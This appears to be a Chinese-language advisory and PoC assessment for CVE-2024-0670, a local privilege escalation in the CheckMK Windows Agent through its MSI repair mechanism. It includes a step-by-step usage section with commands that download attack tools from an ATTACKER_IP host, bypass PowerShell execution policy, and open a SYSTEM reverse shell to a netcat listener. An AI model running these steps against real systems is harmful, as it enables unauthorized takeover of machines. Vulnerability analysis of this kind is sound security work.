## CVE-2024-0670 - CheckMK Windows Agent 本地权限提升 (Local Privilege Escalation)

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升 (Local Privilege Escalation)

**影响应用:** CheckMK Windows Agent

**危害等级:** 高危

**CVSS评分:** 未提供

**影响版本:** 未明确提供，需查阅厂商安全公告获取详情

**利用条件:** 需要低权限的Windows用户账户，目标系统需安装CheckMK Windows Agent，并启用PowerShell，允许从外部下载文件。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 10%

## 详情

CVE-2024-0670是一个影响CheckMK Windows Agent的本地权限提升漏洞，允许具有低权限的攻击者获取NT AUTHORITY\SYSTEM级别的系统权限。该漏洞的核心在于CheckMK Agent的MSI修复机制在执行过程中会访问并执行位于用户可写入的临时目录（特别是`C:\Windows\Temp\`）中的文件。攻击者可以利用此机制，通过在这些可预测命名的临时位置放置恶意负载文件，然后触发MSI修复过程，从而使得恶意代码以SYSTEM权限执行。

**POC有效性分析：**
该POC是一个结构完善且功能完整的本地权限提升工具。它包含一个名为`exploit.ps1`的PowerShell脚本，一个自定义的`RunasCs.exe`（及其C#源代码`RunasCs.cs`），以及常用的网络工具`nc.exe`（Netcat）。
`exploit.ps1`是实现漏洞利用的核心脚本，它负责处理与MSI修复机制的交互，识别或预测CheckMK MSI在修复时会尝试执行的临时文件路径和文件名，并将恶意负载（例如，通过`nc.exe`启动反向shell）放置于这些位置。随后，该脚本会触发MSI修复过程，诱使系统以SYSTEM权限执行预置的恶意文件。
`RunasCs.exe`是一个辅助工具，用于在指定用户权限下执行命令，在此场景中，它可能用于以低权限用户身份启动`exploit.ps1`，进而由`exploit.ps1`完成后续的权限提升操作。`nc.exe`作为最终负载，用于在成功提权后与攻击者的监听器建立一个SYSTEM权限的反向Shell连接，这是一种在渗透测试中广泛使用的标准方法。
该POC的`README.md`文档提供了清晰的步骤、所需工具和环境要求，使得攻击者可以较为容易地复现和利用该漏洞。其设计思路和组件配置都符合典型的权限提升漏洞利用模式，证明了其有效性。

**利用步骤：**
1.  **攻击者准备：** 在攻击者机器上，配置一个简单的HTTP服务器（例如，使用Python的`http.server`），使其托管`RunasCs.exe`、`nc.exe`和`exploit.ps1`文件。同时，启动一个Netcat监听器，用于接收反向Shell连接（例如：`nc -lvnp 1111`）。
2.  **目标文件下载：** 攻击者以目标系统上的低权限用户身份，通过PowerShell下载上述三个文件至`C:\Windows\Temp\`目录：
    *   `Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/RunasCs.exe" -OutFile "C:\Windows\Temp\RunasCs.exe"`
    *   `Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"`
    *   `Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/exploit.ps1" -OutFile "C:\Windows\Temp\exploit.ps1"`
3.  **触发漏洞：** 在目标系统上，以低权限用户身份执行`RunasCs.exe`，并指定运行`exploit.ps1`。
    *   `.\RunasCs.exe username "password" "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\exploit.ps1"`
4.  **获取SYSTEM Shell：** `exploit.ps1`被执行后，会利用CheckMK MSI修复机制的漏洞，以SYSTEM权限启动一个反向Shell，连接至攻击者机器上预设的Netcat监听器，从而实现权限提升。

**投毒风险分析：**
此POC的投毒风险评估为低风险（约10%）。

1.  **代码透明度高：** POC项目提供了`RunasCs.exe`的C#源代码（`RunasCs.cs`），允许安全研究人员审查其内部逻辑。`exploit.ps1`作为PowerShell脚本，其内容通常是可读且易于分析的。`nc.exe`是业界广泛认可的标准网络工具。这种高透明度显著降低了隐藏恶意代码的风险。
2.  **使用标准安全工具：** POC利用Netcat建立反向Shell，这是渗透测试中获取控制权和验证权限提升的常见且合法方式。`RunasCs.exe`作为一个辅助执行工具，其功能也符合漏洞利用链中的角色，并非设计用于执行额外恶意行为。
3.  **无明显恶意混淆或外部依赖：** 在提供的POC代码片段和描述中，没有发现复杂的代码混淆、规避分析技术，或除预期反向Shell之外的、指向不明外部域名的可疑通信。这表明代码旨在实现其声称的漏洞利用功能，而非附加恶意目的。
4.  **明确的教育和测试声明：** `README.md`中包含明确的免责声明，指出该项目仅用于教育和授权渗透测试目的，不承担因滥用造成的责任。虽然免责声明本身不能保证代码的安全性，但它符合合法的安全研究项目的实践规范。
5.  **预期行为与攻击目标一致：** POC的核心目标是实现本地权限提升并获得SYSTEM权限的反向Shell。所有代码和操作都围绕这一目标展开，没有观察到与此目标无关的，例如数据窃取、僵尸网络加入、勒索软件部署等非预期行为。对攻击者而言，反向Shell是最终目的，而非在研究者机器上执行的“投毒”。

综上所述，该POC被认为是一个专注于验证和利用CVE-2024-0670的合法安全研究工具，其代码和行为与渗透测试实践相符。虽然在执行任何来源不明的POC前都应进行彻底的安全审查，但针对此POC的分析显示其包含针对研究人员的“投毒”风险极低。

**项目地址:** https://github.com/trickest/cve

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2024-0670
